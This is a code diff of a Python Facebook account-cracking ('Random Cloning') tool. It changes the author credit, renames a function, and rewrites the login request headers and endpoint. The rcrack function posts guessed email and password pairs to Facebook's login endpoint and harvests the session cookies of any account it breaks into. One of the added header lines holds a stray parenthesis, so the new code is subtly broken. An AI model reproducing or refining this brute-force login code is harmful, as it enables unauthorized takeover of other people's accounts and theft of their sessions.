@@ -127,7 +127,7 @@ logo = ("""
                            
 
  \033[38;5;46m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
- \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mMD UZZAL   \033[38;5;46m
+ \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mUZZAL VAU  \033[38;5;46m
  \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m itzUzzalVau2008               \033[38;5;46m
  \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mUzzalvau              \033[38;5;46m
  \033[38;5;46m     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL STATUS  \033[38;5;196m: \033[38;5;195mRandom Cloning             \033[38;5;46m
@@ -228,7 +228,7 @@ def asha(uid):
     
     
 # APK CHECK
-def Hasan():
+def UZZAL():
     user=[]
     twf =[]
     os.getuid
@@ -293,27 +293,24 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'p.facebook.com',
-            "method": 'POST',
-            "scheme": 'https',
-            "accept": 'application/x-www-form-urlencoded',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://p.facebook.com/',
-            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'empty',
-            "sec-fetch-mode": 'cors',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+           'cache-control': 'max-age=0',
+           'referer': 'https://www.google.com/',
+          'sec-ch-prefers-color-scheme': 'light',
+          'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+          'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+          'sec-ch-ua-mobile': '?1',
+          'sec-ch-ua-platform': '"Android"',
+          'sec-ch-ua-platform-version': '"13.0.0"',
+          'sec-fetch-dest': 'document',
+          'sec-fetch-mode': 'navigate',
+          'sec-fetch-site': 'cross-site',
+          'sec-fetch-user': '?1',
+          'upgrade-insecure-requests': '1',)
             "user-agent": pro}
-            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
